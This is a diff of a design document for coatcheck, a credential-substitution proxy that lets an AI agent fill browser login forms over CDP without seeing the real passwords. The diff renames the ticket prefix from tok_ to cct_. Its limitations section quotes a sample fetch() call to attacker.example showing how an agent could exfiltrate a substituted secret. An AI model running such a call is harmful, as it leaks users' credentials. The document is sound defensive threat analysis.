@@ -7,7 +7,7 @@ mint endpoint in `src/vault-handler.ts`.
 
 ## Problem
 
-coatcheck's HTTPS path swaps tickets (`tok_*`) for real values in request
+coatcheck's HTTPS path swaps tickets (`cct_*`) for real values in request
 headers and URLs. Logging into a website from a remote browser is different:
 the agent drives the browser with Playwright over a Chrome DevTools Protocol
 (CDP) WebSocket, and the password travels inside a CDP frame such as
@@ -18,7 +18,7 @@ prompt injection.
 CDP injection adds a second listener to coatcheck: a WebSocket proxy that sits
 between the agent's Playwright client and the remote browser. It substitutes
 tickets for real values on outbound CDP frames and redacts real values out of
-inbound frames. The agent fills a login form with `page.fill(sel, "tok_…")`
+inbound frames. The agent fills a login form with `page.fill(sel, "cct_…")`
 and never sees the password.
 
 Scope: ordinary HTML login forms. Sites that require 2FA/OTP at login are out
@@ -45,14 +45,14 @@ of sites.
 ## Architecture
 
 ```
-agent ── HTTPS POST /v1/sessions (x-api-key: tok_…) ──▶ coatcheck :3128 (MITM)
+agent ── HTTPS POST /v1/sessions (x-api-key: cct_…) ──▶ coatcheck :3128 (MITM)
                                                          │ swap ticket → real API key
                                                          │ rewrite response connectUrl
                                                          ▼
                                                     browser vendor REST API
 
 agent ── ws://127.0.0.1:8444/cdp/{sid} ──▶ coatcheck :8444 (CDP proxy)
-                                            │ outbound: tok_* → real value
+                                            │ outbound: cct_* → real value
                                             │ inbound:  real value → [REDACTED:…] or drop
                                             ▼
                                         vendor CDP endpoint (real connectUrl)
@@ -141,7 +141,7 @@ response, and the listener binds to loopback by default.
 
 `substituteOutbound` (`src/cdp/substitution.ts:33-95`):
 
-- Pre-filter: if the raw frame contains no `tok_` substring, forward it
+- Pre-filter: if the raw frame contains no `cct_` substring, forward it
   untouched without parsing (`:39`). Most CDP traffic skips JSON parsing.
 - Otherwise parse and substitute only in these fields:
 
@@ -155,7 +155,7 @@ Playwright pads `Runtime.callFunctionOn.arguments` with internal entries
 before user arguments (a probe saw the ticket at index 5), so the code walks
 the whole array (`:62-69`).
 
-- A frame of any other method that contains `tok_` is forwarded unmodified and
+- A frame of any other method that contains `cct_` is forwarded unmodified and
   logged as "token observed in unsupported method" (`:87-88`,
   `src/cdp/proxy.ts:123-127`). Deliberately not substituted in v1:
   `Network.setExtraHTTPHeaders`, `Page.addScriptToEvaluateOnNewDocument`,
@@ -240,7 +240,7 @@ session remains the client's job.
 | Second concurrent CDP connection | Closed 1013. |
 | Upstream does not open within 10 s | Torn down; session tickets revoked. |
 | >256 frames queued before upstream opens | CDP error to client, torn down. |
-| Ticket expired before use | Literal `tok_…` reaches the page; login fails visibly. |
+| Ticket expired before use | Literal `cct_…` reaches the page; login fails visibly. |
 | `page.type()` with a ticket | Last keystroke frame dropped, CDP error returned. |
 | Real value echoed in an inbound frame that cannot be cleaned | Frame dropped; the awaiting client call stalls. |
 | Ticket in an unsupported CDP method | Forwarded unsubstituted, warning logged. |
@@ -258,7 +258,7 @@ session remains the client's job.
   session-scoping and TTL.
 - **`Runtime.evaluate` can exfiltrate directly.** Because `expression` and
   `functionDeclaration` are substitution sites, an agent can send
-  `fetch('https://attacker.example/?p=' + 'tok_…')` and coatcheck will put the
+  `fetch('https://attacker.example/?p=' + 'cct_…')` and coatcheck will put the
   real value into the expression that runs in the page. The same lack of host
   binding as above; there is no restriction on what the substituted script
   does.
